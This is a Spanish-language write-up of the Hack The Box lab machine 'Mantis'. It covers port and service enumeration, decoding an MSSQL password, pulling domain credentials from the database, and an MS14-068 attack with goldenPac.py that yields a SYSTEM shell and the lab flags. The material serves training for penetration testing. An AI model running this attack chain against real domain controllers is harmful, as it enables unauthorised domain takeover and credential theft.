---
layout: post
title: Mantis
date: 2023-02-16
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Mantis-htb/Mantis.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración web

* Enumeración MSSQL

* Enumeración DNS

* Enumeración RPC

* Obtención IPv6

* Enumeración LDAP

* Enumeración con BloodHound

* Golden Ticket Attack - GoldenPac.py (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.52 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:22 GMT
Nmap scan report for 10.10.10.52
Host is up (0.051s latency).
Not shown: 57614 closed tcp ports (reset), 7894 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49161/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
50255/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.61 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49161,49165,49171,50255 10.10.10.52 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:23 GMT
Nmap scan report for 10.10.10.52
Host is up (0.47s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-16 13:24:03Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-16T13:19:10
|_Not valid after:  2053-02-16T13:19:10
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-02-16T13:25:20+00:00; 0s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49171/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-16T13:19:10
|_Not valid after:  2053-02-16T13:19:10
|_ssl-date: 2023-02-16T13:25:20+00:00; 0s from scanner time.
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-02-16T08:25:06-05:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s
| smb2-time: 
|   date: 2023-02-16T13:25:07
|_  start_date: 2023-02-16T13:19:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.01 seconds
```

Añado el dominio ```htb.local```al ```/etc/hosts```

## Puerto 53 (DNS)

Aplico consultas DNS para descubrir subdominios

```null
dig @10.10.10.52 htb.local axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.52 htb.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

```null
dig @10.10.10.52 htb.local ns

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.52 htb.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 64623
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 3d09b52d9f2e10a6 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	NS

;; Query time: 115 msec
;; SERVER: 10.10.10.52#53(10.10.10.52) (UDP)
;; WHEN: Thu Feb 16 13:28:28 GMT 2023
;; MSG SIZE  rcvd: 50
```

```null
dig @10.10.10.52 htb.local mx

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.52 htb.local mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 32584
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 60c2efc5457c8715 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	MX

;; Query time: 143 msec
;; SERVER: 10.10.10.52#53(10.10.10.52) (UDP)
;; WHEN: Thu Feb 16 13:28:41 GMT 2023
;; MSG SIZE  rcvd: 50
```

Pero no encuentro nada

## Puerto 135 (RPC)

De primeras no tengo acceso al servicio

```null
rpcclient -U "" 10.10.10.52 -N -c 'enumdomusers'
result was NT_STATUS_ACCESS_DENIED
```

## Puerto 389 (LDAP)

Enumero los namingcontexts

```null
dapsearch -x -H "ldap://10.10.10.52" -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.52
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
```

No puedo listar recursos compartidos

```null
smbmap -H 10.10.10.52 -u 'null'
[!] Authentication error on 10.10.10.52
```

## Puerto 5722 (MSRPC)

En caso de que la versión sea vulnerable, es posible obtener la dirección IPv6 de la máquina

```null
IOXIDResolver.py -t 10.10.10.52
[*] Retrieving network interface of 10.10.10.52
Address: mantis
Address: 10.10.10.52
Address: dead:beef::add2:50fb:c659:f2ac
```

Aplico un nuevo escaneo por este protocolo

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS dead:beef::add2:50fb:c659:f2ac -6 -oG openportsipv6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:36 GMT
Nmap scan report for dead:beef::add2:50fb:c659:f2ac
Host is up (0.094s latency).
Not shown: 53893 closed tcp ports (reset), 11616 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49161/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
50255/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 35.35 seconds
```

Pero no aparece ningún puerto relevante

## Puerto 1337,8080,47001,49157 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
for port in $(cat portscan | grep http | awk '{print $1}' FS="/" | grep -oP '\d{4,5}'); do echo -e "\n[+] Puerto $port"; whatweb http://10.10.10.52:$port; done

[+] Puerto 1337
http://10.10.10.52:1337 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.52], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]

[+] Puerto 8080
http://10.10.10.52:8080 [200 OK] ASP_NET[4.0.30319][MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.52], MetaGenerator[Orchard], Microsoft-IIS[7.5], Script[text/javascript], Title[Tossed Salad - Blog], UncommonHeaders[x-generator,x-aspnetmvc-version], X-Powered-By[ASP.NET]

[+] Puerto 47001
http://10.10.10.52:47001 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.10.52], Microsoft-HTTPAPI[2.0], Title[Not Found]

[+] Puerto 49157
ERROR Opening: http://10.10.10.52:49157 - Net::ReadTimeout
```

Las páginas principales se ven así:

<img src="/writeups/assets/img/Mantis-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas por el puerto 1337

```null
gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/02/16 13:52:12 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 11]
/*docroot*.aspx       (Status: 400) [Size: 11]
/*.aspx               (Status: 400) [Size: 11]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
/orchard              (Status: 500) [Size: 3026]
/http%3A.aspx         (Status: 400) [Size: 11]
/q%26a.aspx           (Status: 400) [Size: 11]
/**http%3a.aspx       (Status: 400) [Size: 11]
/*http%3A.aspx        (Status: 400) [Size: 11]
/**http%3A.aspx       (Status: 400) [Size: 11]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fblog.aspx (Status: 400) [Size: 11]
/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
/s%26p.aspx           (Status: 400) [Size: 11]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
/%3FRID%3D2671.aspx   (Status: 400) [Size: 11]
/devinmoore*.aspx     (Status: 400) [Size: 11]
/children%2527s_tent.aspx (Status: 400) [Size: 11]
/Wanted%2e%2e%2e.aspx (Status: 400) [Size: 11]
/How_to%2e%2e%2e.aspx (Status: 400) [Size: 11]
/200109*.aspx         (Status: 400) [Size: 11]
/*sa_.aspx            (Status: 400) [Size: 11]
/*dc_.aspx            (Status: 400) [Size: 11]
```

El directorio ```secure_notes``` tiene capacidad de directory listing

<img src="/writeups/assets/img/Mantis-htb/3.png" alt="">

Uno de esos archivos contiene una contraseña en binario

<img src="/writeups/assets/img/Mantis-htb/4.png" alt="">

Sin embargo, esta no es válida. En el nombre del archivo hay una cadena en base64, correspondiente a otra credencial (CTF Like)

```null
echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -ps -r; echo
m$$ql_S@_P@ssW0rd!
```

```null
mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Como la base de datos es muy grande, voy a utilizar una herramienta gráfica llamada ```dbeaver```

<img src="/writeups/assets/img/Mantis-htb/5.png" alt="">

Obtengo credenciales

<img src="/writeups/assets/img/Mantis-htb/6.png" alt="">

La del usuario ```james``` es válida a nivel de sistema

```null
crackmapexec smb 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

Aplico enumeración por LDAP

```null
mkdir ld
cd ld
ldapdomaindump -u 'htb.local\james' -p 'J@m3s_P@ssW0rd!' 10.10.10.52
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

ldapdomaindump -u 'htb.local\james' -p 'J@m3s_P@ssW0rd!' 10.10.10.52
```

# Escalada

Hay muy pocos usuarios

<img src="/writeups/assets/img/Mantis-htb/7.png" alt="">

Para encontrar formas de escalar privilegios utilizo el ingestor ```bloodhound-python```

```null
bloodhound-python -c All -ns 10.10.10.52 -d htb.local -u 'james' -p 'J@m3s_P@ssW0rd!'
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 5 users
INFO: Found 42 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mantis.htb.local
INFO: Ignoring host mantis.htb.local since its reported name  does not match
INFO: Done in 00M 08S
```

<img src="/writeups/assets/img/Mantis-htb/8.png" alt="">

No encuentro nada que me sirva

Intento efectuar un ```Golden Ticket Attack```. Utilizo la herramienta ```goldenPac.py```, perteneciente a la suite de ```impacket```

```null
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file xvCbwVPb.exe
[*] Opening SVCManager on mantis.....
[*] Creating service Jlxr on mantis.....
[*] Starting service Jlxr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Puedo visualizar las dos flags

```null
C:\Windows\system32>type C:\Users\james\Desktop\user.txt
49344fe707f1a64cbd34769ba5bf789d

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
52f99865a2fb85ab3a57708452474b8d
```